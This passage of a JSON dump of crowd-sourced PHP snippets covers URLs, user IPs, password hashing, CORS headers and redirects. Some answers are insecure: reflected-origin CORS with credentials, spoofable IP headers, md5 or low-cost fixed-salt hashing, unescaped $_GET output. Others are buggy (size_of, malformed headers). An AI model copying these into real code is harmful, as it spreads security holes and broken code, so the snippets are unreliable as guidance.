    "description": "$data = \"123_String\";     $whatIWant = substr($data, strpos($data, \"_\") + 1);     echo $whatIWant;\n$arr = explode(\"/\", $string, 2); $first = $arr[0]; \n",
    "reg_date": "2021-10-12T10:18:26.000Z"
  },
  {
    "id": 3694,
    "keyword": null,
    "link": null,
    "title": " php get string size",
    "description": "$str = \"Hello Grepper!\"; echo strlen($str); //echo 14\n/* To measure the length of string there is built-in function in php which returns the exact length of string. */  Syntax: strlen(paramenter);  <?php $name = 'ankur'; echo \"Name Length : \".strlen($name);  // Name Length : 5  $message = 'Welcome greppers !'; echo \"Message Length : \".strlen($message);  // Message Length : 18 ?>    /* I hope it will help you. Namaste */\n$str = 'abcdef'; echo strlen($str); // 6\n",
    "reg_date": "2021-10-12T10:18:26.000Z"
  },
  {
    "id": 3695,
    "keyword": null,
    "link": null,
    "title": " php get timezone",
    "description": "date_default_timezone_set(\"Asia/Kolkata\"); // List of Supported Timezones https://www.php.net/manual/en/timezones.php\necho date_default_timezone_get(); //UTC  //Read more at https://www.php.net/manual/en/function.date-default-timezone-get.php\ndate_default_timezone_set(\"Asia/Ho_Chi_Minh\"); echo(date('Y-m-d H:i:s');)\n",
    "reg_date": "2021-10-12T10:18:26.000Z"
  },
  {
    "id": 3696,
    "keyword": null,
    "link": null,
    "title": " php get total amount of days in month",
    "description": "$DaysInCurrentMonth = date('t');\n",
    "reg_date": "2021-10-12T10:18:26.000Z"
  },
  {
    "id": 3697,
    "keyword": null,
    "link": null,
    "title": " php get type of object",
    "description": "gettype($object);\ngettype($u)\n",
    "reg_date": "2021-10-12T10:18:27.000Z"
  },
  {
    "id": 3698,
    "keyword": null,
    "link": null,
    "title": " php get uploaded file extension",
    "description": "$ext = pathinfo($_FILES[\"file\"][\"name\"], PATHINFO_EXTENSION);\n",
    "reg_date": "2021-10-12T10:18:27.000Z"
  },
  {
    "id": 3699,
    "keyword": null,
    "link": null,
    "title": " php get url",
    "description": "$fullURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];\n$full_url = 'http://'.$_SERVER[HTTP_HOST].$_SERVER[REQUEST_URI];\n<?php       if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')             $url = \"https://\";        else            $url = \"http://\";        // Append the host(domain name, ip) to the URL.        $url.= $_SERVER['HTTP_HOST'];             // Append the requested resource location to the URL        $url.= $_SERVER['REQUEST_URI'];                echo $url;     ?> \n#Get Method and Post Data  Send data through get and Post  $_GET Example ============ <?php if(isset($_GET['name'])){ echo htmlentities($_GET['name']); //or //$name = htmlentities($_GET['name']); //echo $name print_r($_GET); } ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"GET action=get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html> ================ $_POST Example ================ <?php if(isset($_GET['name'])){ //echo htmlentities($_GET['name']); //or //$name = htmlentities($_GET['name']); //echo $name //print_r($_GET); }  if(isset($_POST['name'])){     $name = htmlentities($_POST['name']);     echo $name;     print_r($_POST); } ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"POST\" action=\"get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html> ================ $_REQUEST Example  //another uncommon way to do it. This is not    //normally done this way ================ <?php if(isset($_REQUEST['name'])){     $name = htmlentities($_REQUEST['name']);     echo $name;     print_r($_REQUEST); }  ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"POST\" action=\"get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html> ================ $_SERVER['QUERY_STRING']  Example ================ <?php echo $_SERVER['QUERY_STRING'];   ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"POST\" action=\"get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html>\n$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? \"https\" : \"http\") . \"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\"; \nactual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? \"https\" : \"http\") . \"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\";\n",
    "reg_date": "2021-10-12T10:18:27.000Z"
  },
  {
    "id": 3700,
    "keyword": null,
    "link": null,
    "title": " php get url infos",
    "description": "$url = 'http://username:password@hostname:9090/path?argument=value#fragment'; var_dump(parse_url($url, PHP_URL_SCHEME));   // http var_dump(parse_url($url, PHP_URL_USER));     // username  var_dump(parse_url($url, PHP_URL_PASS));     // password var_dump(parse_url($url, PHP_URL_HOST));     // hostname var_dump(parse_url($url, PHP_URL_PORT));     // 9090 var_dump(parse_url($url, PHP_URL_PATH));     // /path var_dump(parse_url($url, PHP_URL_QUERY));    // argument=value var_dump(parse_url($url, PHP_URL_FRAGMENT)); // fragment  // You can use \"parse_str\" to parse the URL Query to an Array $query = parse_url($url, PHP_URL_QUERY); $queryArray = array(); parse_str($query, $queryArray); var_dump($queryArray);  // array('argument' => 'value')    \n",
    "reg_date": "2021-10-12T10:18:27.000Z"
  },
  {
    "id": 3701,
    "keyword": null,
    "link": null,
    "title": " php get url path name",
    "description": "parse_url( $_SERVER[ 'REQUEST_URI' ], PHP_URL_PATH );\n",
    "reg_date": "2021-10-12T10:18:27.000Z"
  },
  {
    "id": 3702,
    "keyword": null,
    "link": null,
    "title": " php get url with get",
    "description": "$full_url = 'http://'.$_SERVER[HTTP_HOST].$_SERVER[REQUEST_URI];\n",
    "reg_date": "2021-10-12T10:18:27.000Z"
  },
  {
    "id": 3703,
    "keyword": null,
    "link": null,
    "title": " php get user agent",
    "description": "function get_browser_name($user_agent){     $t = strtolower($user_agent);     $t = \" \" . $t;     if     (strpos($t, 'opera'     ) || strpos($t, 'opr/')     ) return 'Opera'            ;        elseif (strpos($t, 'edge'      )                           ) return 'Edge'             ;        elseif (strpos($t, 'chrome'    )                           ) return 'Chrome'           ;        elseif (strpos($t, 'safari'    )                           ) return 'Safari'           ;        elseif (strpos($t, 'firefox'   )                           ) return 'Firefox'          ;        elseif (strpos($t, 'msie'      ) || strpos($t, 'trident/7')) return 'Internet Explorer';     return 'Unkown'; } echo get_browser_name($_SERVER['HTTP_USER_AGENT']);//Chrome\n$_SERVER['HTTP_USER_AGENT']\n",
    "reg_date": "2021-10-12T10:18:27.000Z"
  },
  {
    "id": 3704,
    "keyword": null,
    "link": null,
    "title": " php get user ip",
    "description": "The simplest way to collect the Client/Visitor IP address using PHP is the REMOTE_ADDR. Pass the 'REMOTE_ADDR' in PHP $_SERVER variable. It will return the IP address of the visitor who is currently viewing the webpage.  Get the IP address of the website <?php echo 'User IP Address : '. $_SERVER['REMOTE_ADDR']; ?>    /* I Hope it will help you. Namaste Stay Home Stay Safe */\n$ip = $_SERVER['REMOTE_ADDR'];\n$_SERVER['REMOTE_ADDR']\n$clientIPAddress=$_SERVER['REMOTE_ADDR']; \nfunction getIp() {     $ip = $_SERVER['REMOTE_ADDR'];       if (!empty($_SERVER['HTTP_CLIENT_IP'])) {         $ip = $_SERVER['HTTP_CLIENT_IP'];     } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {         $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];     }       return $ip; }\n#to best handle proxies use this: if (!empty($_SERVER['HTTP_CLIENT_IP'])) {     $ip = $_SERVER['HTTP_CLIENT_IP']; } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {     $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; } else {     $ip = $_SERVER['REMOTE_ADDR']; }\n",
    "reg_date": "2021-10-12T10:18:27.000Z"
  },
  {
    "id": 3705,
    "keyword": null,
    "link": null,
    "title": " php get user ip address",
    "description": "The simplest way to collect the Client/Visitor IP address using PHP is the REMOTE_ADDR. Pass the 'REMOTE_ADDR' in PHP $_SERVER variable. It will return the IP address of the visitor who is currently viewing the webpage.  Get the IP address of the website <?php echo 'User IP Address : '. $_SERVER['REMOTE_ADDR']; ?>    /* I Hope it will help you. Namaste Stay Home Stay Safe */\n$ip = $_SERVER['REMOTE_ADDR'];\n$clientIPAddress=$_SERVER['REMOTE_ADDR']; \nfunction getIp() {     $ip = $_SERVER['REMOTE_ADDR'];       if (!empty($_SERVER['HTTP_CLIENT_IP'])) {         $ip = $_SERVER['HTTP_CLIENT_IP'];     } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {         $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];     }       return $ip; }\n#to best handle proxies use this: if (!empty($_SERVER['HTTP_CLIENT_IP'])) {     $ip = $_SERVER['HTTP_CLIENT_IP']; } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {     $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; } else {     $ip = $_SERVER['REMOTE_ADDR']; }\n<?php  // Most effective way to get users IP function get_ip_address(){     foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key){         if (array_key_exists($key, $_SERVER) === true){             foreach (explode(',', $_SERVER[$key]) as $ip){                 $ip = trim($ip); // just to be safe                  if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false){                     return $ip;                 }             }         }     } }  ?>\n",
    "reg_date": "2021-10-12T10:18:27.000Z"
  },
  {
    "id": 3706,
    "keyword": null,
    "link": null,
    "title": " php get username from iis",
    "description": "//If you've set IIS to authenticate users one or more of these should //contain the username:  $_SERVER['LOGON_USER'] $_SERVER['AUTH_USER'] $_SERVER['REDIRECT_LOGON_USER'] $_SERVER['REDIRECT_AUTH_USER']\n",
    "reg_date": "2021-10-12T10:18:28.000Z"
  },
  {
    "id": 3707,
    "keyword": null,
    "link": null,
    "title": " php get value from url",
    "description": "$full_url = 'http://'.$_SERVER[HTTP_HOST].$_SERVER[REQUEST_URI];\n$id = $_GET['id']; // OR  $id = $_REQUEST['id'];\n#Get Method and Post Data  Send data through get and Post  $_GET Example ============ <?php if(isset($_GET['name'])){ echo htmlentities($_GET['name']); //or //$name = htmlentities($_GET['name']); //echo $name print_r($_GET); } ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"GET action=get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html> ================ $_POST Example ================ <?php if(isset($_GET['name'])){ //echo htmlentities($_GET['name']); //or //$name = htmlentities($_GET['name']); //echo $name //print_r($_GET); }  if(isset($_POST['name'])){     $name = htmlentities($_POST['name']);     echo $name;     print_r($_POST); } ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"POST\" action=\"get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html> ================ $_REQUEST Example  //another uncommon way to do it. This is not    //normally done this way ================ <?php if(isset($_REQUEST['name'])){     $name = htmlentities($_REQUEST['name']);     echo $name;     print_r($_REQUEST); }  ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"POST\" action=\"get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html> ================ $_SERVER['QUERY_STRING']  Example ================ <?php echo $_SERVER['QUERY_STRING'];   ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"POST\" action=\"get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html>\n<a href=\"index.php?id=<?php echo $my_id;?>&name=<?php echo $my_name;?>Click</a>  <?php $id = intval($_GET['id']);\t\t// integer value $name = strval($_GET['name']);\t// string value ?>\n// previous link  <a href=\"test_get.php?subject=PHP&web=W3schools.com\">Test $GET</a> // the code <?php echo \"Study \" . $_GET['subject'] . \" at \" . $_GET['web']; ?> \n",
    "reg_date": "2021-10-12T10:18:28.000Z"
  },
  {
    "id": 3708,
    "keyword": null,
    "link": null,
    "title": " php get version",
    "description": "echo PHP_VERSION;\n",
    "reg_date": "2021-10-12T10:18:28.000Z"
  },
  {
    "id": 3709,
    "keyword": null,
    "link": null,
    "title": " php get youtube code from url",
    "description": "<?php $url = \"http://www.youtube.com/watch?v=C4kxS1ksqtw&feature=relate\"; parse_str( parse_url( $url, PHP_URL_QUERY ), $my_array_of_vars ); echo $my_array_of_vars['v'];       // Output: C4kxS1ksqtw ?> \n",
    "reg_date": "2021-10-12T10:18:28.000Z"
  },
  {
    "id": 3710,
    "keyword": null,
    "link": null,
    "title": " php global variable function",
    "description": "<?php   $myVariable = \"a\";   function changeVar($newVar) {     global $myVariable     $myVariable = \"b\";   }   echo $myVariable; // Should echo b ?>\n$a = 1; $b = 2; function Sum(){     global $a, $b; // allows access to vars outside of function     $b = $a + $b; }   Sum(); echo $b; // output is 3\n",
    "reg_date": "2021-10-12T10:18:28.000Z"
  },
  {
    "id": 3711,
    "keyword": null,
    "link": null,
    "title": " php go to another page",
    "description": "  <?php header(\"Location: anotherDirectory/anotherFile.php\"); ?>\nheader(\"Location: http://example.com/redirect_page.php\"); die(); //Force the script to quit, or you would raise an error...\n",
    "reg_date": "2021-10-12T10:18:28.000Z"
  },
  {
    "id": 3712,
    "keyword": null,
    "link": null,
    "title": " php goto",
    "description": "<?php goto a; echo 'Foo';   a: echo 'Bar'; ?>\n",
    "reg_date": "2021-10-12T10:18:28.000Z"
  },
  {
    "id": 3713,
    "keyword": null,
    "link": null,
    "title": " php grab month from date",
    "description": "$month = date(\"m\",strtotime($mydate));\n$dateTime = new DateTime(); $month = $dateTime->format('m');\n",
    "reg_date": "2021-10-12T10:18:28.000Z"
  },
  {
    "id": 3714,
    "keyword": null,
    "link": null,
    "title": " php grab year from date",
    "description": "$year = date(\"y\",strtotime($mydate));\n",
    "reg_date": "2021-10-12T10:18:28.000Z"
  },
  {
    "id": 3715,
    "keyword": null,
    "link": null,
    "title": " php group array by value and count",
    "description": "$colors=array(\"red\",\"red\",\"red\",\"blue\",\"green\"); $colorsCount=array_count_values($colors); print_r($colorsCount); #Array #( #    [red] => 3 #    [blue] => 1 #    [green] => 1 #)\n",
    "reg_date": "2021-10-12T10:18:28.000Z"
  },
  {
    "id": 3716,
    "keyword": null,
    "link": null,
    "title": " php group multidimensional array by value",
    "description": "function arraySort($input,$sortkey){   foreach ($input as $key=>$val) $output[$val[$sortkey]][]=$val;   return $output; }\n",
    "reg_date": "2021-10-12T10:18:29.000Z"
  },
  {
    "id": 3717,
    "keyword": null,
    "link": null,
    "title": " php has been blocked by CORS policy",
    "description": "header(\"Access-Control-Allow-Origin: *\"); header(\"Access-Control-Allow-Methods: GET,HEAD,OPTIONS,POST,PUT\"); header(\"Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Authorization\");\n",
    "reg_date": "2021-10-12T10:18:29.000Z"
  },
  {
    "id": 3718,
    "keyword": null,
    "link": null,
    "title": " php hash",
    "description": "// To hash the password, use password_hash(\"MySuperSafePassword!\", PASSWORD_DEFAULT)    // To compare hash with plain text, use password_verify(\"MySuperSafePassword!\", $hashed_password)\n//hash password $pass = password_hash($password, PASSWORD_DEFAULT);  //verify password password_verify($password, $hashed_password); // returns true\n /* User's password. */ $password = 'my secret password';  /* Secure password hash. */ $hash = password_hash($password, PASSWORD_DEFAULT);  \n$password = 'test123';  /* \tAlways use salt for security reasons.     I'm using the BCRYPT algorithm use any valid one you like. */ $options['salt'] = 'usesomesillystringforsalt'; $options['cost'] = 3; echo password_hash($password, PASSWORD_BCRYPT, $options)\n <?php echo hash('ripemd160', 'The quick brown fox jumped over the lazy dog.'); ?>  \nhash($hashingMethod, $dataToBeHashed, $BinaryOutputMode = false)    some hashingMethod options:  md5 sha1 sha256 sha384 sha512\n",
    "reg_date": "2021-10-12T10:18:29.000Z"
  },
  {
    "id": 3719,
    "keyword": null,
    "link": null,
    "title": " php hash password",
    "description": "//hash password $pass = password_hash($password, PASSWORD_DEFAULT);  //verify password password_verify($password, $hashed_password); // returns true\n /* User's password. */ $password = 'my secret password';  /* Secure password hash. */ $hash = password_hash($password, PASSWORD_DEFAULT);  \n <?php /**  * We just want to hash our password using the current DEFAULT algorithm.  * This is presently BCRYPT, and will produce a 60 character result.  *  * Beware that DEFAULT may change over time, so you would want to prepare  * By allowing your storage to expand past 60 characters (255 would be good)  */ echo password_hash(\"rasmuslerdorf\", PASSWORD_DEFAULT); ?>  \n <?php echo 'Argon2i hash: ' . password_hash('rasmuslerdorf', PASSWORD_ARGON2I); ?>  \n <?php /**  * In this case, we want to increase the default cost for BCRYPT to 12.  * Note that we also switched to BCRYPT, which will always be 60 characters.  */ $options = [     'cost' => 12, ]; echo password_hash(\"rasmuslerdorf\", PASSWORD_BCRYPT, $options); ?>  \n /* New password. */ $password = $_POST['password'];  /* Remember to validate the password. */  /* Create the new password hash. */ $hash = password_hash($password, PASSWORD_DEFAULT);  \n /* Include the database connection script. */ include 'pdo.php';  /* Login status: false = not authenticated, true = authenticated. */ $login = FALSE;  /* Username from the login form. */ $username = $_POST['username'];  /* Password from the login form. */ $password = $_POST['password'];  /* Remember to validate $username and $password. */  /* Look for the username in the database. */ $query = 'SELECT * FROM accounts WHERE (account_name = :name)';  /* Values array for PDO. */ $values = [':name' => $username];  /* Execute the query */ try {   $res = $pdo->prepare($query);   $res->execute($values); } catch (PDOException $e) {   /* Query error. */   echo 'Query error.';   die(); }  $row = $res->fetch(PDO::FETCH_ASSOC);  /* If there is a result, check if the password matches using password_verify(). */ if (is_array($row)) {   if (password_verify($password, $row['account_passwd']))   {     /* The password is correct. */     $login = TRUE;   } }  \n /* Include the database connection script. */ include 'pdo.php';  /* Username. */ $username = 'John';  /* Password. */ $password = 'my secret password';  /* Secure password hash. */ $hash = password_hash($password, PASSWORD_DEFAULT);  /* Insert query template. */ $query = 'INSERT INTO accounts (account_name, account_passwd) VALUES (:name, :passwd)';  /* Values array for PDO. */ $values = [':name' => $username, ':passwd' => $hash];  /* Execute the query. */ try {   $res = $pdo->prepare($query);   $res->execute($values); } catch (PDOException $e) {   /* Query error. */   echo 'Query error.';   die(); }  \n /* User's password. */ $password = 'my secret password';  /* MD5 hash to be saved in the database. */ $hash = md5($password);  \n /* 100 ms. */ $time = 0.1;  /* Initial cost. */ $cost = 10;  /* Loop until the time required is more than 100ms. */ do {   /* Increase the cost. */   $cost++;      /* Check how much time we need to create the hash. */   $start = microtime(true);   password_hash('test', PASSWORD_BCRYPT, ['cost' => $cost]);   $end = microtime(true); } while (($end - $start) < $time);  echo 'Cost found: ' . $cost;  \n",
    "reg_date": "2021-10-12T10:18:29.000Z"
  },
  {
    "id": 3720,
    "keyword": null,
    "link": null,
    "title": " php header 500",
    "description": "header(\"HTTP/1.0 500 Internal Server Error\");\n",
    "reg_date": "2021-10-12T10:18:29.000Z"
  },
  {
    "id": 3721,
    "keyword": null,
    "link": null,
    "title": " php header allow cross origin",
    "description": " <?php  header(\"Access-Control-Allow-Origin: *\");\nheader(\"Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}\");\n header(\"Access-Control-Allow-Origin: *\");\n/**  *  An example CORS-compliant method.  It will allow any GET, POST, or OPTIONS requests from any  *  origin.  *  *  In a production environment, you probably want to be more restrictive, but this gives you  *  the general idea of what is involved.  For the nitty-gritty low-down, read:  *  *  - https://developer.mozilla.org/en/HTTP_access_control  *  - http://www.w3.org/TR/cors/  *  */ function cors() {      // Allow from any origin     if (isset($_SERVER['HTTP_ORIGIN'])) {         // Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one         // you want to allow, and if so:         header(\"Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}\");         header('Access-Control-Allow-Credentials: true');         header('Access-Control-Max-Age: 86400');    // cache for 1 day     }      // Access-Control headers are received during OPTIONS requests     if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {          if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))             // may also be using PUT, PATCH, HEAD etc             header(\"Access-Control-Allow-Methods: GET, POST, OPTIONS\");                   if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))             header(\"Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}\");          exit(0);     }      echo \"You have CORS!\"; }\n",
    "reg_date": "2021-10-12T10:18:29.000Z"
  },
  {
    "id": 3722,
    "keyword": null,
    "link": null,
    "title": " php header base64 pdf",
    "description": "<?php   \theader(\"Pragma: public\");     header(\"Expires: 0\");     header(\"Accept-Ranges: bytes\");     header(\"Cache-Control: must-revalidate, post-check=0, pre-check=0\");     header(\"Content-Type: application/pdf\");     header(\"Content-Disposition: attachment; filename=order.pdf\");     header(\"Content-Transfer-Encoding: binary\");      print base64_decode($res);\n",
    "reg_date": "2021-10-12T10:18:29.000Z"
  },
  {
    "id": 3723,
    "keyword": null,
    "link": null,
    "title": " php header json",
    "description": "header('Content-Type: application/json'); echo json_encode($data);\n $array = array();  $array['Name'] = 'Alex'; $array['Age'] = 37; $array['Admin'] = TRUE;  $array['Contact'] = array (   'Site' => \"alexwebdevelop.com\",   'Phone' => 123456789,   'Address' => NULL );  $array['Tags'] = array('php', 'web', 'dev');  $json = json_encode($array, JSON_PRETTY_PRINT);  echo '<pre>'; echo $json; echo '</pre>';  \n",
    "reg_date": "2021-10-12T10:18:29.000Z"
  },
  {
    "id": 3724,
    "keyword": null,
    "link": null,
    "title": " php header location",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n<?php // This will just redirect you to example.com header(\"Location: https://example.com\");   ?>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?> \n<?php   header('Location: http://www.aaaa/index.php');   exit();\t\t// useless to let script running ?>  <?php   // permanent redirection (default is 302, 303 for most robots)   header('Location: http://www.aaaa/index.php', true, 301);   exit();\t\t// useless to let script running ?>  // or a meta in html header (if html generation is initiated)  <head> \t<meta http-equiv=\"Location\" content=\"http://www.aaaa/index.php\"> </head> // or waits 15s before redirection <head>   \t<meta http-equiv=\"refresh\" content=\"15;URL=http://www.aaaa/index.php\"> </head>  // or via javascript <script> \twindow.location.replace('http://www.aaaa/index.php'); </script>\nheader(\"Location: http://example.com\"); die();\n<?php // This will just redirect you to example.com $url = \"https://example.com\"; header(\"Location: $url\");   ?>\n",
    "reg_date": "2021-10-12T10:18:29.000Z"
  },
  {
    "id": 3725,
    "keyword": null,
    "link": null,
    "title": " php header location not working",
    "description": "// If header throws an error - use this as temp solution. <?php echo '<script type=\"text/javascript\"> location.replace(\"https://your_replaced_url_location_goes_here.com/\"); </script>'; ?>   \nheader() must be called before any actual output is sent, either by normal HTML tags, blank lines in a file, or from PHP\n",
    "reg_date": "2021-10-12T10:18:29.000Z"
  },
  {
    "id": 3726,
    "keyword": null,
    "link": null,
    "title": " php header redirect",
    "description": "<?php // This will just redirect you to example.com header(\"Location: https://example.com\");   ?>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?> \n<?php   header('Location: http://www.aaaa/index.php');   exit();\t\t// useless to let script running ?>  <?php   // permanent redirection (default is 302, 303 for most robots)   header('Location: http://www.aaaa/index.php', true, 301);   exit();\t\t// useless to let script running ?>  // or a meta in html header (if html generation is initiated)  <head> \t<meta http-equiv=\"Location\" content=\"http://www.aaaa/index.php\"> </head> // or waits 15s before redirection <head>   \t<meta http-equiv=\"refresh\" content=\"15;URL=http://www.aaaa/index.php\"> </head>  // or via javascript <script> \twindow.location.replace('http://www.aaaa/index.php'); </script>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?>\n<?php // This will just redirect you to example.com $url = \"https://example.com\"; header(\"Location: $url\");   ?>\n<?php /* \tThis will redirect  to facebook.com */ $url = \"https://facebook.com.com\"; header(\"Location: $url\");   exit; ?>\n",
    "reg_date": "2021-10-12T10:18:30.000Z"
  },
  {
    "id": 3727,
    "keyword": null,
    "link": null,
    "title": " php header redirect same page",
    "description": "header(\"Location: \" . \"http://\" . $_SERVER['HTTP_HOST'] . $location);\n",
    "reg_date": "2021-10-12T10:18:30.000Z"
  },
  {
    "id": 3728,
    "keyword": null,
    "link": null,
    "title": " php header refresh",
    "description": "//Refreshes your current page header(\"Refresh:0\"); header(\"Refresh:2\"); // Refreshes after 2 seconds  //If you need to redirect it to another page header(\"Refresh:0; url=page2.php\");\nheader(\"Refresh:0\");\nheader(\"Refresh:0\");   header(\"Refresh:0; url=page2.php\");\nheader(\"url=thepage.php;refresh:3\"); exit(); // The user will be redirected after 3 seconds to thepage.php\n",
    "reg_date": "2021-10-12T10:18:30.000Z"
  },
  {
    "id": 3729,
    "keyword": null,
    "link": null,
    "title": " php header to another page",
    "description": "header('Location: http://www.example.com/');\n",
    "reg_date": "2021-10-12T10:18:30.000Z"
  },
  {
    "id": 3730,
    "keyword": null,
    "link": null,
    "title": " php hello world",
    "description": "<?php     echo \"Hello World\"; ?>\necho \"Hello World\";\necho \"Hello, World!\";\nprint \"Hello World!\";\n<? echo \"Hello world\"; ?>\n<?php  echo \"Hello World\"  ?>\n",
    "reg_date": "2021-10-12T10:18:30.000Z"
  },
  {
    "id": 3731,
    "keyword": null,
    "link": null,
    "title": " php heredoc",
    "description": "\t$output = <<<HTML \t<p>Lorem ipsum dolor sit amet consectetur<p> \t<a href=\"{$foobar}\">click here</a> HTML;\n$str = <<<MYTEXT This is a demo message with heredoc. MYTEXT;   echo $str;\n<?php $str = <<<EOD Exemple de cha&icirc;ne sur plusieurs lignes en utilisant la syntaxe Heredoc. EOD;  /* Exemple plus complexe, avec des variables. */ class foo {     var $foo;     var $bar;      function __construct()     {         $this->foo = 'Foo';         $this->bar = array('Bar1', 'Bar2', 'Bar3');     } }  $foo = new foo(); $name = 'MyName';  echo <<<EOT Mon nom est \"$name\". J'affiche quelques $foo->foo. Maintenant, j'affiche quelques {$foo->bar[1]}. Et ceci devrait afficher un 'A' majuscule : \\x41 EOT; ?>\n$name = 'name';  $str =  <<<EOT  my name is $name   line 2  line 3    \" you can put double quote    ' you can put simple quote    few lines   EOT; // take it at the beginning of the line  echo $str;  \n",
    "reg_date": "2021-10-12T10:18:30.000Z"
  },
  {
    "id": 3732,
    "keyword": null,
    "link": null,
    "title": " php hide errors",
    "description": "ini_set('display_errors', 0); ini_set('display_startup_errors', 0); error_reporting(0);  /* joshiyogesh0333@gmail.com */\n",
    "reg_date": "2021-10-12T10:18:30.000Z"
  },
  {
    "id": 3733,
    "keyword": null,
    "link": null,
    "title": " php hour between",
    "description": "$currentTime = (new DateTime('01:00'))->modify('+1 day'); $startTime = new DateTime('22:00'); $endTime = (new DateTime('07:00'))->modify('+1 day');  if ($currentTime >= $startTime && $currentTime <= $endTime) {     // Do something }\n",
    "reg_date": "2021-10-12T10:18:30.000Z"
  },
  {
    "id": 3734,
    "keyword": null,
    "link": null,
    "title": " php how to count array",
    "description": "$array = ['x', 'y', 'z']; count($array); // output 3 size_of($array); // output 3\n",
    "reg_date": "2021-10-12T10:18:30.000Z"
  },
  {
    "id": 3735,
    "keyword": null,
    "link": null,
    "title": " php how to delete file",
    "description": "if(file_exists($file)) { \tunlink($file); } \n/* Deleting files is a concept in file handeling of PHP We can remove or delete the file from real folder path using below code */  unlink($Your_file_path);   // direct deleting the file  /* Delete file if its exist in folder */  if (file_exists($Your_file_path)) {   unlink($Your_file_path); }   /* I hope it will help you. Namaste */\n",
    "reg_date": "2021-10-12T10:18:31.000Z"
  },
  {
    "id": 3736,
    "keyword": null,
    "link": null,
    "title": " php how to rename a file before saving it",
    "description": "$temp = explode(\".\", $_FILES[\"file\"][\"name\"]); $newfilename = round(microtime(true)) . '.' . end($temp); move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"../img/imageDirectory/\" . $newfilename);\n",
    "reg_date": "2021-10-12T10:18:31.000Z"
  },
  {
    "id": 3737,
    "keyword": null,
    "link": null,
    "title": " php http build query",
    "description": "$data = [     'foo' => 'bar',     'baz' => 'boom',     'cow' => 'milk',     'php' => 'hypertext processor' ];  echo http_build_query($data); // output: foo=bar&baz=boom&cow=milk&php=hypertext+processor  echo http_build_query($data, '', '&amp;'); // output: foo=bar&amp;baz=boom&amp;cow=milk&amp;php=hypertext+processor\n <?php $data = array(     'foo' => 'bar',     'baz' => 'boom',     'cow' => 'milk',     'php' => 'hypertext processor' );  echo http_build_query($data) . \"\\n\"; echo http_build_query($data, '', '&');  ?>  \n",
